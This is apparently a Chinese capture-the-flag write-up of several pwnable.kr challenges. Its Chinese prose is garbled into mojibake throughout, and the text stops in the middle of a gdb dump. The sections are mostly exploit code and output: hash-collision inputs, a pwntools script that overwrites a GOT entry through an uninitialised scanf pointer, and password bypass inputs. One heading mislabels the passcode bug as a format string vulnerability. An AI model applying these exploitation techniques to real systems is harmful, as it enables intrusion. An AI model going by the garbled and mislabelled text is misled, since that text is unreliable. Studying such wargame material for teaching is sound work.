<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">./col `echo -n -e &quot;\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xcc\xce\xc5\x06&quot; `</span><br><span class="line"> </span><br><span class="line">./col $(python -c &#x27;print &quot;\xc9\xce\xc5\x06&quot;*4+&quot;\xc8\xce\xc5\x06&quot;&#x27;)</span><br><span class="line"></span><br><span class="line">./col `python -c &quot;print &#x27;\x01\x01\x01\x01&#x27;*4 + &#x27;\xe8\x05\xd9\x1d&#x27;&quot;`</span><br><span class="line"></span><br><span class="line">./col b4_9b4_9b4_9b4e4d8ZA(å¤§ä½¬è¡Œä¸º)</span><br></pre></td></tr></table></figure>

<p>åˆ†æä¸€ä¸‹<code>python</code>è¿™ä¸ªå°è„šæœ¬</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pic@ubuntu:~/Desktop$ (python -c &#x27;print &quot;\x6c\x73&quot;&#x27;)</span><br><span class="line">ls</span><br><span class="line">pic@ubuntu:~/Desktop$ $(python -c &#x27;print &quot;\x6c\x73&quot;&#x27;)</span><br><span class="line">col  flag  te.py</span><br><span class="line">pic@ubuntu:~/Desktop$ ls</span><br><span class="line">col  flag  te.py</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹åˆ°æŠŠ<code>ls</code>ç»è¿‡è½¬æ¢åç„¶åç”¨pythonæ‰“å°ï¼Œä¸åŠ <code>$</code>å°±æ˜¯æ™®é€šæ‰“å°ï¼ŒåŠ ä¸Šå°±æ˜¯<code>ls</code>å‘½ä»¤ï¼Œ<code>echo</code>å‘½ä»¤åŒç†</p>
<blockquote>
<p>æ·±å…¥åˆ†æpwnable.krä¸Šçš„é¢˜ç³»åˆ—[ä¸‰]</p>
</blockquote>
<h2 id="random"><a href="#random" class="headerlink" title="random"></a>random</h2><p>çœ‹åˆ°è¿™é¢˜ï¼Œæœ¬è´¨å°±æ˜¯<code>rand()</code>å‡½æ•°çš„ä¼ªéšæœºï¼Œæˆ‘ä»¬åœ¨<code>rand</code>å‡½æ•°ä¹‹å‰ï¼Œæœªä½¿ç”¨<code>srand</code>å‡½æ•°ç»™ç§å­ï¼Œ<code>rand</code>å°±è‡ªå·±è°ƒç”¨<code>srand(1)</code>ï¼Œï¼ˆå…¶å®<code>srand(0)</code>ä¹Ÿæ˜¯è¿™æ•°ï¼Œæˆ‘ä»¬çœ‹çœ‹è¿™ä¸ªå°demo</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()&#123;</span><br><span class="line">	unsigned int random;</span><br><span class="line">	random = rand();</span><br><span class="line">	printf(&quot;first is %p\n&quot;,random);</span><br><span class="line">	for(int i =0;i&lt;10;i++)&#123;</span><br><span class="line">		srand(i);			</span><br><span class="line">		random = rand();</span><br><span class="line">		printf(&quot;num %d is %p\n&quot;,i,random);</span><br><span class="line">		&#125;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pic@ubuntu:~/Desktop$ ./te </span><br><span class="line">first is 0x6b8b4567</span><br><span class="line">num 0 is 0x6b8b4567</span><br><span class="line">num 1 is 0x6b8b4567</span><br><span class="line">num 2 is 0x59b997fa</span><br><span class="line">num 3 is 0x47db4e3a</span><br><span class="line">num 4 is 0x754e7ddd</span><br><span class="line">num 5 is 0x232add1b</span><br><span class="line">num 6 is 0x11560ebd</span><br><span class="line">num 7 is 0x3e52dff5</span><br><span class="line">num 8 is 0x2d274378</span><br><span class="line">num 9 is 0x1a7dd803</span><br></pre></td></tr></table></figure>

<h2 id="passcode"><a href="#passcode" class="headerlink" title="passcode"></a>passcode</h2><p>å…ˆæŠŠè¿™ä¸ªæ–‡ä»¶<code>scp</code>ä¸‹è½½ä¸‹æ¥ï¼Œ<code>scp -P 2222  passcode@pwnable.kr:/home/passcode/passcode /home/pic/Desktop</code>ï¼Œpwnableä¸Šçš„sshç«¯å£å…¨éƒ½æ”¹æˆäº†2222ï¼Œæ‰€ä»¥éœ€è¦æŒ‡å®šä¸€ä¸‹ï¼Œä¸‹æ¥åæˆ‘ä»¬å…ˆç ”ç©¶ä¸€ä¸‹æ¼æ´ç‚¹ï¼Œcæ–‡ä»¶å¦‚ä¸‹</p>
<blockquote>
<p>Safeguardã€operation and source code</p>
</blockquote>
<p>sshè¿æ¥ä¸Šå»åç›´æ¥è¿è¡Œåå‘ç°å‡ºé”™ï¼Œæˆ‘ä»¬ä½¿ç”¨<strong>scp</strong>å‘½ä»¤ä»æœåŠ¡å™¨ä¸‹è½½ä¸‹æ¥æºç å’Œç¨‹åºè¿›è¡Œè¿›ä¸€æ­¥é€†å‘åˆ†æ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">âœ  ä¸‹è½½ ./passcode </span><br><span class="line">Toddler&#x27;s Secure Login System 1.0 beta.</span><br><span class="line">enter you name : 1</span><br><span class="line">Welcome 1!</span><br><span class="line">enter passcode1 : 1</span><br><span class="line">[1]    7138 segmentation fault (core dumped)  ./passcode</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">void login()&#123;</span><br><span class="line">	int passcode1;</span><br><span class="line">	int passcode2;</span><br><span class="line"></span><br><span class="line">	printf(&quot;enter passcode1 : &quot;);</span><br><span class="line">	scanf(&quot;%d&quot;, &amp;passcode1);</span><br><span class="line">	fflush(stdin);</span><br><span class="line"></span><br><span class="line">	// ha! mommy told me that 32bit is vulnerable to bruteforcing :)</span><br><span class="line">	printf(&quot;enter passcode2 : &quot;);</span><br><span class="line">        scanf(&quot;%d&quot;, &amp;passcode2);</span><br><span class="line"></span><br><span class="line">	printf(&quot;checking...\n&quot;);</span><br><span class="line">	if(passcode1==338150 &amp;&amp; passcode2==13371337)&#123;</span><br><span class="line">                printf(&quot;Login OK!\n&quot;);</span><br><span class="line">                system(&quot;/bin/cat flag&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">                printf(&quot;Login Failed!\n&quot;);</span><br><span class="line">		exit(0);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void welcome()&#123;</span><br><span class="line">	char name[100];</span><br><span class="line">	printf(&quot;enter you name : &quot;);</span><br><span class="line">	scanf(&quot;%100s&quot;, name);</span><br><span class="line">	printf(&quot;Welcome %s!\n&quot;, name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">	printf(&quot;Toddler&#x27;s Secure Login System 1.0 beta.\n&quot;);</span><br><span class="line"></span><br><span class="line">	welcome();</span><br><span class="line">	login();</span><br><span class="line"></span><br><span class="line">	// something after login...</span><br><span class="line">	printf(&quot;Now I can safely trust you that you have credential :)\n&quot;);</span><br><span class="line">	return 0;	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>The program has a format string vulnerability</p>
</blockquote>
<p><code>scanf(&quot;%d&quot;, passcode1)</code></p>
<p>æƒ³è¦åˆ©ç”¨è¿™ä¸ªæ¼æ´å¾ˆç®€å•ï¼Œè¿™ä¸ªæ¼æ´åŸç†å°±æ˜¯å¦‚æœä¸åŠ &amp;ï¼Œscanfå°±ä¼š<strong>é»˜è®¤ä»æ ˆä¸­è¯»å–4å­—èŠ‚å½“æˆpasscode1çš„åœ°å€</strong>ï¼ˆå¥½è‰ç‡çš„è¯´ï¼‰<br>äºæ˜¯æ€è·¯æœ‰äº†ï¼Œå°±æ˜¯æŠŠæŸä¸ªå‡½æ•°GOTåœ°å€æ”¹æˆ<code>system(&quot;/bin/cat flag&quot;)</code>è¿™ä¸ªåé—¨å‡½æ•°å³å¯æˆåŠŸçœ‹åˆ°flagï¼šï¼‰</p>
<p>æ€è·¯å¦‚ä¸‹ï¼š</p>
<ul>
<li>çŸ¥é“nameå’Œpasscode1çš„åç§»</li>
<li>æ‰¾åˆ°fflushå‡½æ•°çš„GOTåœ°å€</li>
<li>æ‰¾åˆ°æˆ‘ä»¬çš„åé—¨å‡½æ•°åœ°å€</li>
<li>åˆ©ç”¨æœ¬ç¨‹åºæ¼æ´å†™å‡ºåˆ©ç”¨ä»£ç </li>
</ul>
<blockquote>
<p>Write exp</p>
</blockquote>
<p>é¦–å…ˆåˆ©ç”¨idaæŸ¥å‡ºnameå’Œpasscode1çš„åç§»ï¼Œæˆ‘ä»¬å‘ç°è¿™ä¸¤ä¸ªå˜é‡åœ¨welcomeå’Œloginä¸­ä½¿ç”¨ï¼Œä¸¤æ¬¡å‡½æ•°çš„<strong>æé«˜å †æ ˆ</strong>çš„æ“ä½œç›¸åŒï¼Œäºæ˜¯æˆ‘ä»¬çŸ¥é“è¿™ä¸¤ä¸ªæ ˆä½¿ç”¨äº†åŒä¸€ä¸ª<strong>ebp</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov     eax, offset a100s ; &quot;%100s&quot;</span><br><span class="line">lea     edx, [ebp+var_70]</span><br><span class="line">mov     [esp+4], edx</span><br><span class="line">mov     [esp], eax</span><br><span class="line">call    ___isoc99_scanf</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov     eax, offset aD  ; &quot;%d&quot;</span><br><span class="line">mov     edx, [ebp+var_10]</span><br><span class="line">mov     [esp+4], edx</span><br><span class="line">mov     [esp], eax</span><br><span class="line">call    ___isoc99_scanf</span><br></pre></td></tr></table></figure>
<p>ä½¿ç”¨objdumpçœ‹ä¸€ä¸‹GOTè¡¨</p>
<p><code>objdump -R passcode</code></p>
<p>è¯»ä¸€ä¸‹GOTè¡¨åæ‰¾åˆ°</p>
<p><code>0804a004 R_386_JUMP_SLOT   fflush@GLIBC_2.0</code></p>
<p>è¯¥å‡½æ•°åœ¨è¾“å…¥passcodeåè‡ªåŠ¨è°ƒç”¨ï¼Œç›´æ¥æ›´æ”¹è¿™ä¸ªå‡½æ•°å°±è¡Œï¼é€šè¿‡idaçœ‹åˆ°åé—¨å‡½æ•°åœ°å€</p>
<p><code>080485E3 mov     dword ptr [esp], offset command ; &quot;/bin/cat flag</code></p>
<p>ä¸‡äº‹å…·å¤‡ï¼Œç¼–å†™expï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = process(&#x27;./passcode&#x27;)</span><br><span class="line">fflush_got_addr = 0x0804a004</span><br><span class="line">flag_addr = 0x080485E3</span><br><span class="line">payload = &#x27;a&#x27; * 96 + p32(fflush_got_addr) + str(flag_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>è¿™æ ·å†™å¹¶ä¸ä¼˜é›…ï¼Œå¯èƒ½éƒ¨åˆ†äººä¼šè®¤ä¸ºæ€ä¹ˆpayloadç›´æ¥å°±è¾“è¿›å»äº†ï¼Ÿï¼Ÿå…¶å®è¿™åªæ˜¯å‡‘å·§äº†ï¼Œ96ä¸ªå­—èŠ‚çš„<code>a</code>åŠ ä¸Šä¹‹åçš„<code>p32(fflush_got_addr)</code>æ­£å¥½æ˜¯100ä¸ªå¼€è¾Ÿçš„nameå¤§å°ï¼Œåº”è¯¥æ˜¯è¿™æ ·</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sleep(1)</span><br><span class="line">payload = &#x27;a&#x27; * 96 + p32(fflush_got_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">sleep(1)</span><br><span class="line">payload = str(flag_addr)</span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure>
<p>æ•ˆæœç›¸åŒï¼Œæˆ‘ä»¬ç”¨ä¸€ä¸ªå°demoå…·ä½“è¯´æ˜</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">void world()&#123;</span><br><span class="line">	int passcode1;</span><br><span class="line">	printf(&quot;enter passcode1 : &quot;);</span><br><span class="line">	scanf(&quot;%d&quot;, &amp;passcode1);</span><br><span class="line">	printf(&quot;%d\n&quot;,passcode1);</span><br><span class="line">&#125;</span><br><span class="line">void hello()&#123;</span><br><span class="line">	char name[5];</span><br><span class="line">	printf(&quot;enter you name : &quot;);</span><br><span class="line">	scanf(&quot;%5s&quot;, name);</span><br><span class="line">	printf(&quot;Welcome %s!\n&quot;, name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">	hello();</span><br><span class="line">	world();</span><br><span class="line">	return 0;	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pic@ubuntu:~/Desktop$ ./flag</span><br><span class="line">enter you name : 123456</span><br><span class="line">Welcome 12345!</span><br><span class="line">enter passcode1 : 6</span><br></pre></td></tr></table></figure>
<p>å¤§è‡´æ˜¯è¿™æ„æ€ğŸ˜€</p>
<blockquote>
<p>æ·±å…¥åˆ†æpwnable.krä¸Šçš„é¢˜ç³»åˆ—[å››]</p>
</blockquote>
<h2 id="mistake"><a href="#mistake" class="headerlink" title="mistake"></a>mistake</h2><p>æœ¬é¢˜çš„å…³é”®å°±æ˜¯ç¬¦å·ä¼˜å…ˆæ€§ï¼Œæˆ‘ä»¬å†™ä¸ªdemo</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main(int argc, char* argv[])&#123;</span><br><span class="line">	int test;</span><br><span class="line">	if(test = -1&lt;0)</span><br><span class="line">		printf(&quot;%d\n&quot;,test);</span><br><span class="line">	else</span><br><span class="line">		printf(&quot;??what happened\n&quot;);</span><br><span class="line">	printf(&quot;%d\n&quot;,test);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pic@ubuntu:~/Desktop$ ./c</span><br><span class="line">1</span><br><span class="line">1</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬é€šè¿‡å°demoçœ‹å‡ºæ¥ï¼Œå…¶å®å¹¶ä¸æ˜¯å…ˆèµ‹å€¼ï¼Œè€Œæ˜¯å…ˆæ‰§è¡Œ<code>&lt;</code>åœ¨æ‰§è¡Œ<code>=</code>ï¼Œå³<code>test=(-1&lt;0)</code></p>
<p>æˆ‘ä»¬åˆ†æä¸€ä¸‹æºä»£ç </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line"></span><br><span class="line">#define PW_LEN 10</span><br><span class="line">#define XORKEY 1</span><br><span class="line"></span><br><span class="line">void xor(char* s, int len)&#123;</span><br><span class="line">	int i;</span><br><span class="line">	for(i=0; i&lt;len; i++)&#123;</span><br><span class="line">		s[i] ^= XORKEY;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char* argv[])&#123;</span><br><span class="line">	</span><br><span class="line">	int fd;</span><br><span class="line">	if(fd=open(&quot;/home/mistake/password&quot;,O_RDONLY,0400) &lt; 0)&#123;  //openå‡½æ•°ä»¥åªè¯»æ–¹å¼æ‰“å¼€ï¼Œé”™è¯¯åˆ™è¿”å›-1ï¼Œifè¯­å¥æˆç«‹ï¼Œå‘ä¸‹æ‰§è¡Œ</span><br><span class="line">		printf(&quot;can&#x27;t open password %d\n&quot;, fd); //fdåªèƒ½æ˜¯1</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br><span class="line">  //fdä¸º0å‘ä¸‹æ‰§è¡Œ</span><br><span class="line">	printf(&quot;do not bruteforce...\n&quot;);</span><br><span class="line">	sleep(time(0)%20);</span><br><span class="line"></span><br><span class="line">	char pw_buf[PW_LEN+1];</span><br><span class="line">	int len;</span><br><span class="line">	if(!(len=read(fd,pw_buf,PW_LEN) &gt; 0))&#123;  //æ ‡å‡†è¯»å…¥ï¼Œè¾“å…¥å³å¯</span><br><span class="line">		printf(&quot;read error\n&quot;);</span><br><span class="line">		close(fd);</span><br><span class="line">		return 0;		</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	char pw_buf2[PW_LEN+1];</span><br><span class="line">	printf(&quot;input password : &quot;);</span><br><span class="line">	scanf(&quot;%10s&quot;, pw_buf2);</span><br><span class="line"></span><br><span class="line">	// xor your input</span><br><span class="line">	xor(pw_buf2, 10);</span><br><span class="line"></span><br><span class="line">	if(!strncmp(pw_buf, pw_buf2, PW_LEN))&#123;</span><br><span class="line">		printf(&quot;Password OK\n&quot;);</span><br><span class="line">		system(&quot;/bin/cat flag\n&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	else&#123;</span><br><span class="line">		printf(&quot;Wrong Password\n&quot;);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	close(fd);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æ‰€ä»¥åˆ†æåˆ°è¿™ç§ç¨‹åº¦è¾“å…¥å°±è¡Œ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mistake@prowl:~$ ./mistake </span><br><span class="line">do not bruteforce...</span><br><span class="line">0000000000</span><br><span class="line">input password : 1111111111</span><br><span class="line">Password OK</span><br><span class="line">Mommy, the operator priority always confuses me :(</span><br></pre></td></tr></table></figure>


<blockquote>
<p>æ·±å…¥åˆ†æpwnable.krä¸Šçš„é¢˜ç³»åˆ—[äº”]</p>
</blockquote>
<h2 id="leg"><a href="#leg" class="headerlink" title="leg"></a>leg</h2><p>çœ‹åˆ°æœ¬é¢˜æ˜¯armæ±‡ç¼–ï¼Œæˆ‘ä»¬ç›´æ¥çœ‹çœ‹cä»£ç </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">int key1()&#123;</span><br><span class="line">	asm(&quot;mov r3, pc\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">int key2()&#123;</span><br><span class="line">	asm(</span><br><span class="line">	&quot;push	&#123;r6&#125;\n&quot;</span><br><span class="line">	&quot;add	r6, pc, $1\n&quot;</span><br><span class="line">	&quot;bx	r6\n&quot;</span><br><span class="line">	&quot;.code   16\n&quot;</span><br><span class="line">	&quot;mov	r3, pc\n&quot;</span><br><span class="line">	&quot;add	r3, $0x4\n&quot;</span><br><span class="line">	&quot;push	&#123;r3&#125;\n&quot;</span><br><span class="line">	&quot;pop	&#123;pc&#125;\n&quot;</span><br><span class="line">	&quot;.code	32\n&quot;</span><br><span class="line">	&quot;pop	&#123;r6&#125;\n&quot;</span><br><span class="line">	);</span><br><span class="line">&#125;</span><br><span class="line">int key3()&#123;</span><br><span class="line">	asm(&quot;mov r3, lr\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">int main()&#123;</span><br><span class="line">	int key=0;</span><br><span class="line">	printf(&quot;Daddy has very strong arm! : &quot;);</span><br><span class="line">	scanf(&quot;%d&quot;, &amp;key);</span><br><span class="line">	if( (key1()+key2()+key3()) == key )&#123;</span><br><span class="line">		printf(&quot;Congratz!\n&quot;);</span><br><span class="line">		int fd = open(&quot;flag&quot;, O_RDONLY);</span><br><span class="line">		char buf[100];</span><br><span class="line">		int r = read(fd, buf, 100);</span><br><span class="line">		write(0, buf, r);</span><br><span class="line">	&#125;</span><br><span class="line">	else&#123;</span><br><span class="line">		printf(&quot;I have strong leg :P\n&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>emmmï¼Œçœ‹ä¸å¤ªæ‡‚ï¼ŒåªçŸ¥é“<code>key1()+key2()+key3()) == key</code>åˆ™å¾—åˆ°flagï¼Œç›´æ¥æ’¸æ±‡ç¼–å§ï¼ŒæŒ¨ä¸ªåˆ†æ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disass key1</span><br><span class="line">Dump of assembler code for function key1:</span><br><span class="line">   0x00008cd4 &lt;+0&gt;:	push	&#123;r11&#125;		; (str r11, [sp, #-4]!)</span><br><span class="line">   0x00008cd8 &lt;+4&gt;:	add	r11, sp, #0</span><br><span class="line">   0x00008cdc &lt;+8&gt;:	mov	r3, pc</span><br><span class="line">   0x00008ce0 &lt;+12&gt;:	mov	r0, r3</span><br><span class="line">   0x00008ce4 &lt;+16&gt;:	sub	sp, r11, #0</span><br><span class="line">   0x00008ce8 &lt;+20&gt;:	pop	&#123;r11&#125;		; (ldr r11, [sp], #4)</span><br><span class="line">   0x00008cec &lt;+24&gt;:	bx	lr</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">int key1()&#123;</span><br><span class="line">	asm(&quot;mov r3, pc\n&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>key1å‡½æ•°æ±‡ç¼–å±‚é¢åªæ˜¯å¤šä½œäº†ä¸€ä¸ªæ ˆçš„å¤„ç†ï¼Œæˆ‘ä»¬åªéœ€è¦çŸ¥é“pcå¯„å­˜å™¨çš„å€¼ï¼Œä¸”å…¶æœ‰è¯»å†™é™åˆ¶ï¼Œå½“æ²¡æœ‰è¶…è¿‡è¯»å–é™åˆ¶çš„æ—¶å€™ï¼Œè¯»å–çš„å€¼æ˜¯æŒ‡ä»¤çš„åœ°å€åŠ ä¸Š8ä¸ªå­—èŠ‚ï¼Œæ•…è¿”å›å€¼r0ï¼ˆarmè¿”å›å€¼ä¸ºr0ï¼‰ä¸º0x00008ce4</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disass key2</span><br><span class="line">Dump of assembler code for function key2:</span><br><span class="line">   0x00008cf0 &lt;+0&gt;:	push	&#123;r11&#125;		; (str r11, [sp, #-4]!)</span><br><span class="line">   0x00008cf4 &lt;+4&gt;:	add	r11, sp, #0</span><br><span class="line">   0x00008cf8 &lt;+8&gt;:	push	&#123;r6&#125;		; (str r6, [sp, #-4]!)</span><br><span class="line">   0x00008cfc &lt;+12&gt;:	add	r6, pc, #1</span><br><span class="line">   0x00008d00 &lt;+16&gt;:	bx	r6</span><br><span class="line">   0x00008d04 &lt;+20&gt;:	mov	r3, pc</span><br><span class="line">   0x00008d06 